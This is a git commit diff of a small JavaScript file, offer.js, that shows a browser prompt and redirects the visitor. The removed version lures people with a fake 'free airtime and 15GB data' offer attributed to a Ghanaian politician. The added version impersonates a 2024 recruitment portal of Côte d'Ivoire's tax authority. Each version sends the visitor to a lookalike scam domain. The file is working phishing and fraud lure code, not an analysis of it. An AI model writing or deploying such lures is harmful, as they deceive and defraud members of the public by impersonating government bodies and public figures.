fdbb4b480e79481f9eec2dc09034578eb29fa4b9
decullian <decullianresort@gmail.com>
2024-08-16 02:49:03 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = ''
+password=prompt('Bienvenue sur le portail de recrutement de la Direction générale des impôts 2024, appuyez sur OK pour continuer ','');
+if (password != '') {
+location.href='https://dgi-gouv-ci.programs.lat/jobs';
 }
